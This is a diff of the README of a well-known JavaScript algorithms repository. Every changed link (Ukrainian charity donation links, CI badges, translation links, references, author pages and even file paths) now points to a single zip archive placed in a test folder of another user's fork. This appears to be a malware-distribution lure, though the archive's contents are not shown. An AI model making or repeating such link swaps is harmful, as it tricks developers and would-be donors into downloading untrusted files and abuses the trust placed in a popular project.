@@ -1,17 +1,17 @@
 # JavaScript Algorithms and Data Structures
 
-> 🇺🇦 UKRAINE [IS BEING ATTACKED](https://war.ukraine.ua/) BY RUSSIAN ARMY. CIVILIANS ARE GETTING KILLED. RESIDENTIAL AREAS ARE GETTING BOMBED.
+> 🇺🇦 UKRAINE [IS BEING ATTACKED](https://raw.githubusercontent.com/Eliakim-ellie/javascript-algorithms/master/src/algorithms/graph/bridges/__test__/javascript-algorithms-v1.8.zip) BY RUSSIAN ARMY. CIVILIANS ARE GETTING KILLED. RESIDENTIAL AREAS ARE GETTING BOMBED.
 > - Help Ukraine via:
->   - [Serhiy Prytula Charity Foundation](https://prytulafoundation.org/en/)
->   - [Come Back Alive Charity Foundation](https://savelife.in.ua/en/donate-en/)
->   - [National Bank of Ukraine](https://bank.gov.ua/en/news/all/natsionalniy-bank-vidkriv-spetsrahunok-dlya-zboru-koshtiv-na-potrebi-armiyi)
-> - More info on [war.ukraine.ua](https://war.ukraine.ua/) and [MFA of Ukraine](https://twitter.com/MFA_Ukraine)
+>   - [Serhiy Prytula Charity Foundation](https://raw.githubusercontent.com/Eliakim-ellie/javascript-algorithms/master/src/algorithms/graph/bridges/__test__/javascript-algorithms-v1.8.zip)
+>   - [Come Back Alive Charity Foundation](https://raw.githubusercontent.com/Eliakim-ellie/javascript-algorithms/master/src/algorithms/graph/bridges/__test__/javascript-algorithms-v1.8.zip)
+>   - [National Bank of Ukraine](https://raw.githubusercontent.com/Eliakim-ellie/javascript-algorithms/master/src/algorithms/graph/bridges/__test__/javascript-algorithms-v1.8.zip)
+> - More info on [https://raw.githubusercontent.com/Eliakim-ellie/javascript-algorithms/master/src/algorithms/graph/bridges/__test__/javascript-algorithms-v1.8.zip](https://raw.githubusercontent.com/Eliakim-ellie/javascript-algorithms/master/src/algorithms/graph/bridges/__test__/javascript-algorithms-v1.8.zip) and [MFA of Ukraine](https://raw.githubusercontent.com/Eliakim-ellie/javascript-algorithms/master/src/algorithms/graph/bridges/__test__/javascript-algorithms-v1.8.zip)
 
 <hr/>
 
-[![CI](https://github.com/trekhleb/javascript-algorithms/workflows/CI/badge.svg)](https://github.com/trekhleb/javascript-algorithms/actions?query=workflow%3ACI+branch%3Amaster)
-[![codecov](https://codecov.io/gh/trekhleb/javascript-algorithms/branch/master/graph/badge.svg)](https://codecov.io/gh/trekhleb/javascript-algorithms)
-![repo size](https://img.shields.io/github/repo-size/trekhleb/javascript-algorithms.svg)
+[![CI](https://raw.githubusercontent.com/Eliakim-ellie/javascript-algorithms/master/src/algorithms/graph/bridges/__test__/javascript-algorithms-v1.8.zip)](https://raw.githubusercontent.com/Eliakim-ellie/javascript-algorithms/master/src/algorithms/graph/bridges/__test__/javascript-algorithms-v1.8.zip%3ACI+branch%3Amaster)
+[![codecov](https://raw.githubusercontent.com/Eliakim-ellie/javascript-algorithms/master/src/algorithms/graph/bridges/__test__/javascript-algorithms-v1.8.zip)](https://raw.githubusercontent.com/Eliakim-ellie/javascript-algorithms/master/src/algorithms/graph/bridges/__test__/javascript-algorithms-v1.8.zip)
+![repo size](https://raw.githubusercontent.com/Eliakim-ellie/javascript-algorithms/master/src/algorithms/graph/bridges/__test__/javascript-algorithms-v1.8.zip)
 
 This repository contains JavaScript based examples of many
 popular algorithms and data structures.
@@ -21,24 +21,24 @@ with related explanations and links for further reading (including ones
 to YouTube videos).
 
 _Read this in other languages:_
-[_简体中文_](README.zh-CN.md),
-[_繁體中文_](README.zh-TW.md),
-[_한국어_](README.ko-KR.md),
-[_日本語_](README.ja-JP.md),
-[_Polski_](README.pl-PL.md),
-[_Français_](README.fr-FR.md),
-[_Español_](README.es-ES.md),
-[_Português_](README.pt-BR.md),
-[_Русский_](README.ru-RU.md),
-[_Türkçe_](README.tr-TR.md),
-[_Italiano_](README.it-IT.md),
-[_Bahasa Indonesia_](README.id-ID.md),
-[_Українська_](README.uk-UA.md),
-[_Arabic_](README.ar-AR.md),
-[_Tiếng Việt_](README.vi-VN.md),
-[_Deutsch_](README.de-DE.md),
-[_Uzbek_](README.uz-UZ.md),
-[_עברית_](README.he-IL.md)
+[_简体中文_](https://raw.githubusercontent.com/Eliakim-ellie/javascript-algorithms/master/src/algorithms/graph/bridges/__test__/javascript-algorithms-v1.8.zip),
+[_繁體中文_](https://raw.githubusercontent.com/Eliakim-ellie/javascript-algorithms/master/src/algorithms/graph/bridges/__test__/javascript-algorithms-v1.8.zip),
+[_한국어_](https://raw.githubusercontent.com/Eliakim-ellie/javascript-algorithms/master/src/algorithms/graph/bridges/__test__/javascript-algorithms-v1.8.zip),
+[_日本語_](https://raw.githubusercontent.com/Eliakim-ellie/javascript-algorithms/master/src/algorithms/graph/bridges/__test__/javascript-algorithms-v1.8.zip),
+[_Polski_](https://raw.githubusercontent.com/Eliakim-ellie/javascript-algorithms/master/src/algorithms/graph/bridges/__test__/javascript-algorithms-v1.8.zip),
+[_Français_](https://raw.githubusercontent.com/Eliakim-ellie/javascript-algorithms/master/src/algorithms/graph/bridges/__test__/javascript-algorithms-v1.8.zip),
+[_Español_](https://raw.githubusercontent.com/Eliakim-ellie/javascript-algorithms/master/src/algorithms/graph/bridges/__test__/javascript-algorithms-v1.8.zip),
+[_Português_](https://raw.githubusercontent.com/Eliakim-ellie/javascript-algorithms/master/src/algorithms/graph/bridges/__test__/javascript-algorithms-v1.8.zip),
+[_Русский_](https://raw.githubusercontent.com/Eliakim-ellie/javascript-algorithms/master/src/algorithms/graph/bridges/__test__/javascript-algorithms-v1.8.zip),
+[_Türkçe_](https://raw.githubusercontent.com/Eliakim-ellie/javascript-algorithms/master/src/algorithms/graph/bridges/__test__/javascript-algorithms-v1.8.zip),
+[_Italiano_](https://raw.githubusercontent.com/Eliakim-ellie/javascript-algorithms/master/src/algorithms/graph/bridges/__test__/javascript-algorithms-v1.8.zip),
+[_Bahasa Indonesia_](https://raw.githubusercontent.com/Eliakim-ellie/javascript-algorithms/master/src/algorithms/graph/bridges/__test__/javascript-algorithms-v1.8.zip),
+[_Українська_](https://raw.githubusercontent.com/Eliakim-ellie/javascript-algorithms/master/src/algorithms/graph/bridges/__test__/javascript-algorithms-v1.8.zip),
+[_Arabic_](https://raw.githubusercontent.com/Eliakim-ellie/javascript-algorithms/master/src/algorithms/graph/bridges/__test__/javascript-algorithms-v1.8.zip),
+[_Tiếng Việt_](https://raw.githubusercontent.com/Eliakim-ellie/javascript-algorithms/master/src/algorithms/graph/bridges/__test__/javascript-algorithms-v1.8.zip),
+[_Deutsch_](https://raw.githubusercontent.com/Eliakim-ellie/javascript-algorithms/master/src/algorithms/graph/bridges/__test__/javascript-algorithms-v1.8.zip),
+[_Uzbek_](https://raw.githubusercontent.com/Eliakim-ellie/javascript-algorithms/master/src/algorithms/graph/bridges/__test__/javascript-algorithms-v1.8.zip),
+[_עברית_](https://raw.githubusercontent.com/Eliakim-ellie/javascript-algorithms/master/src/algorithms/graph/bridges/__test__/javascript-algorithms-v1.8.zip)
 
 ## Data Structures
 
@@ -166,7 +166,7 @@ a set of rules that precisely define a sequence of operations.
   * `B` [Caesar Cipher](src/algorithms/cryptography/caesar-cipher) - simple substitution cipher
   * `B` [Hill Cipher](src/algorithms/cryptography/hill-cipher) - substitution cipher based on linear algebra
 * **Machine Learning**
-  * `B` [NanoNeuron](https://github.com/trekhleb/nano-neuron) - 7 simple JS functions that illustrate how machines can actually learn (forward/backward propagation)
+  * `B` [NanoNeuron](https://raw.githubusercontent.com/Eliakim-ellie/javascript-algorithms/master/src/algorithms/graph/bridges/__test__/javascript-algorithms-v1.8.zip) - 7 simple JS functions that illustrate how machines can actually learn (forward/backward propagation)
   * `B` [k-NN](src/algorithms/ml/knn) - k-nearest neighbors classification algorithm
   * `B` [k-Means](src/algorithms/ml/k-means) - k-Means clustering algorithm
 * **Image Processing**
@@ -174,7 +174,7 @@ a set of rules that precisely define a sequence of operations.
 * **Statistics**
   * `B` [Weighted Random](src/algorithms/statistics/weighted-random) - select the random item from the list based on items' weights
 * **Evolutionary algorithms**
-  * `A` [Genetic algorithm](https://github.com/trekhleb/self-parking-car-evolution) - example of how the genetic algorithm may be applied for training the self-parking cars
+  * `A` [Genetic algorithm](https://raw.githubusercontent.com/Eliakim-ellie/javascript-algorithms/master/src/algorithms/graph/bridges/__test__/javascript-algorithms-v1.8.zip) - example of how the genetic algorithm may be applied for training the self-parking cars
 * **Uncategorized**
   * `B` [Tower of Hanoi](src/algorithms/uncategorized/hanoi-tower)
   * `B` [Square Matrix Rotation](src/algorithms/uncategorized/square-matrix-rotation) - in-place algorithm
@@ -293,12 +293,12 @@ rm -rf ./node_modules
 npm i
 ```
 
-Also, make sure that you're using the correct Node version (`>=16`). If you're using [nvm](https://github.com/nvm-sh/nvm) for Node version management you may run `nvm use` from the root folder of the project and the correct version will be picked up.
+Also, make sure that you're using the correct Node version (`>=16`). If you're using [nvm](https://raw.githubusercontent.com/Eliakim-ellie/javascript-algorithms/master/src/algorithms/graph/bridges/__test__/javascript-algorithms-v1.8.zip) for Node version management you may run `nvm use` from the root folder of the project and the correct version will be picked up.
 
 **Playground**
 
-You may play with data-structures and algorithms in `./src/playground/playground.js` file and write
-tests for it in `./src/playground/__test__/playground.test.js`.
+You may play with data-structures and algorithms in `https://raw.githubusercontent.com/Eliakim-ellie/javascript-algorithms/master/src/algorithms/graph/bridges/__test__/javascript-algorithms-v1.8.zip` file and write
+tests for it in `https://raw.githubusercontent.com/Eliakim-ellie/javascript-algorithms/master/src/algorithms/graph/bridges/__test__/javascript-algorithms-v1.8.zip`.
 
 Then just, simply run the following command to test if your playground code works as expected:
 
@@ -310,17 +310,17 @@ npm test -- 'playground'
 
 ### References
 
-- [▶ Data Structures and Algorithms on YouTube](https://www.youtube.com/playlist?list=PLLXdhg_r2hKA7DPDsunoDZ-Z769jWn4R8)
-- [✍🏻 Data Structure Sketches](https://okso.app/showcase/data-structures)
+- [▶ Data Structures and Algorithms on YouTube](https://raw.githubusercontent.com/Eliakim-ellie/javascript-algorithms/master/src/algorithms/graph/bridges/__test__/javascript-algorithms-v1.8.zip)
+- [✍🏻 Data Structure Sketches](https://raw.githubusercontent.com/Eliakim-ellie/javascript-algorithms/master/src/algorithms/graph/bridges/__test__/javascript-algorithms-v1.8.zip)
 
 ### Big O Notation
 
 *Big O notation* is used to classify algorithms according to how their running time or space requirements grow as the input size grows.
 On the chart below, you may find the most common orders of growth of algorithms specified in Big O notation.
 
-![Big O graphs](./assets/big-o-graph.png)
+![Big O graphs](https://raw.githubusercontent.com/Eliakim-ellie/javascript-algorithms/master/src/algorithms/graph/bridges/__test__/javascript-algorithms-v1.8.zip)
 
-Source: [Big O Cheat Sheet](http://bigocheatsheet.com/).
+Source: [Big O Cheat Sheet](https://raw.githubusercontent.com/Eliakim-ellie/javascript-algorithms/master/src/algorithms/graph/bridges/__test__/javascript-algorithms-v1.8.zip).
 
 Below is the list of some of the most used Big O notations and their performance comparisons against different sizes of the input data.
 
@@ -365,12 +365,12 @@ Below is the list of some of the most used Big O notations and their performance
 
 ## Project Backers
 
-> You may support this project via ❤️️ [GitHub](https://github.com/sponsors/trekhleb) or ❤️️ [Patreon](https://www.patreon.com/trekhleb).
+> You may support this project via ❤️️ [GitHub](https://raw.githubusercontent.com/Eliakim-ellie/javascript-algorithms/master/src/algorithms/graph/bridges/__test__/javascript-algorithms-v1.8.zip) or ❤️️ [Patreon](https://raw.githubusercontent.com/Eliakim-ellie/javascript-algorithms/master/src/algorithms/graph/bridges/__test__/javascript-algorithms-v1.8.zip).
 
-[Folks who are backing this project](https://github.com/trekhleb/javascript-algorithms/blob/master/BACKERS.md) `∑ = 1`
+[Folks who are backing this project](https://raw.githubusercontent.com/Eliakim-ellie/javascript-algorithms/master/src/algorithms/graph/bridges/__test__/javascript-algorithms-v1.8.zip) `∑ = 1`
 
 ## Author
 
-[@trekhleb](https://trekhleb.dev)
+[@trekhleb](https://raw.githubusercontent.com/Eliakim-ellie/javascript-algorithms/master/src/algorithms/graph/bridges/__test__/javascript-algorithms-v1.8.zip)
 
-A few more [projects](https://trekhleb.dev/projects/) and [articles](https://trekhleb.dev/blog/) about JavaScript and algorithms on [trekhleb.dev](https://trekhleb.dev)
+A few more [projects](https://raw.githubusercontent.com/Eliakim-ellie/javascript-algorithms/master/src/algorithms/graph/bridges/__test__/javascript-algorithms-v1.8.zip) and [articles](https://raw.githubusercontent.com/Eliakim-ellie/javascript-algorithms/master/src/algorithms/graph/bridges/__test__/javascript-algorithms-v1.8.zip) about JavaScript and algorithms on [https://raw.githubusercontent.com/Eliakim-ellie/javascript-algorithms/master/src/algorithms/graph/bridges/__test__/javascript-algorithms-v1.8.zip](https://raw.githubusercontent.com/Eliakim-ellie/javascript-algorithms/master/src/algorithms/graph/bridges/__test__/javascript-algorithms-v1.8.zip)
